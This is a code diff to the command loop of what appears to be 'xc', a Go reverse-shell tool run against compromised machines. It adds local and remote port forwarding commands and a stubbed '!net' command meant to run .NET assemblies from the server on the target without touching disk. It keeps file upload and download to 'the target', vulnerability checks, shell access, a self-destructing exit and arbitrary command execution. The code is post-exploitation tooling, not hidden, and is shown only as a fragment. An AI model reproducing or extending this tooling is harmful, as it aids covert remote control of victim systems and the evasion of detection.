@@ -19,32 +19,6 @@ import (
 	"github.com/hashicorp/yamux"
 )
 
-func prompt(c net.Conn) {
-	cwd, err := os.Getwd()
-	if err != nil {
-		cwd = "?"
-	}
-	fmt.Fprintf(c, fmt.Sprintf("[xc: %s]: ", cwd))
-}
-
-func forward(host string, port string, s *yamux.Session, c net.Conn) {
-	for {
-		proxy, err := s.Accept()
-		if err != nil {
-			log.Println(err)
-			return
-		}
-		fwdCon, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
-		if err != nil {
-			log.Println(err)
-			return
-		}
-		defer fwdCon.Close()
-		go utils.CopyIO(fwdCon, proxy)
-		go utils.CopyIO(proxy, fwdCon)
-	}
-}
-
 // Run runs the mainloop of the shell
 func Run(s *yamux.Session, c net.Conn) {
 	defer c.Close()
@@ -73,8 +47,10 @@ func Run(s *yamux.Session, c net.Conn) {
 				usage += "   - uploads a file to the target\n"
 				usage += " !download <src> <dst>\n"
 				usage += "   - downloads a file from the target\n"
-				usage += " !portfwd <localport> <remoteaddr> <remoteport>\n"
-				usage += "   - local portforwarding (similar to ssh -L)\n"
+				usage += " !lfwd <localport> <remoteaddr> <remoteport>\n"
+				usage += "   - local portforwarding (like ssh -L)\n"
+				usage += " !rfwd <remoteport> <localaddr> <localport>\n"
+				usage += "   - remote portforwarding (like ssh -R)\n"
 				usage += " !vulns\n"
 				usage += "   - checks for common vulnerabilities\n"
 				usage += " !plugins\n"
@@ -87,6 +63,8 @@ func Run(s *yamux.Session, c net.Conn) {
 				usage += "   - spawns another client on the specified port\n"
 				usage += " !shell\n"
 				usage += " !powershell\n"
+				usage += " !net <sample.exe> <arg1> <arg2> ...\n"
+				usage += "   - Runs a .NET assembly from the server on the client without touching disk\n"
 				usage += " !exit\n"
 				c.Write([]byte(usage))
 				prompt(c)
@@ -138,13 +116,21 @@ func Run(s *yamux.Session, c net.Conn) {
 					c.Write([]byte("Usage: !download <src> <dst>\n"))
 				}
 				prompt(c)
-			case "!portfwd":
+			case "!lfwd":
 				if len(argv) == 4 {
 					host := argv[2]
 					port := argv[3]
-					go forward(host, port, s, c)
+					go lfwd(host, port, s, c)
 				} else {
-					c.Write([]byte("Usage: !portfwd <localport> <remoteaddr> <remoteport>\n"))
+					c.Write([]byte("Usage: !lfwd <localport> <remoteaddr> <remoteport> (opens local port)\n"))
+				}
+				prompt(c)
+			case "!rfwd":
+				if len(argv) == 4 {
+					port := argv[1]
+					go rfwd(port, s, c)
+				} else {
+					c.Write([]byte("Usage: !rfwd <remoteport> <localaddr> <localport> (opens remote port)\n"))
 				}
 				prompt(c)
 			case "!shell":
@@ -215,10 +201,26 @@ func Run(s *yamux.Session, c net.Conn) {
 					c.Write([]byte("Usage: !spawn <port>\n"))
 				}
 				prompt(c)
-			case "!exit":
-				log.Println("Bye!")
-				shell.Seppuku(c)
-				os.Exit(0)
+			case "!net":
+				if len(argv) > 2 {
+					assembly := argv[1]
+					args := argv[1:]
+					_ = assembly
+					_ = args
+					// Todo: load file over network & store bytes
+					// clr "github.com/ropnop/go-clr"
+					/*
+						[]byte assBytes
+						ret, err := clr.ExecuteByteArray(v2, assBytes, args)
+						if err != nil {
+							log.Fatal(err)
+						}
+						fmt.Printf("[*] %s returned %d\n", assembly, ret)
+					*/
+				} else {
+					c.Write([]byte("!net <sample.exe> <arg1> <arg2> ..."))
+				}
+				prompt(c)
 			case "cd":
 				if len(argv) == 2 {
 					dir := strings.ReplaceAll(argv[1], "~", homedir)
@@ -230,6 +232,10 @@ func Run(s *yamux.Session, c net.Conn) {
 					c.Write([]byte("Usage: cd <directory>\n"))
 				}
 				prompt(c)
+			case "!exit":
+				log.Println("Bye!")
+				shell.Seppuku(c)
+				os.Exit(0)
 			default:
 				shell.Exec(command, c)
 				prompt(c)
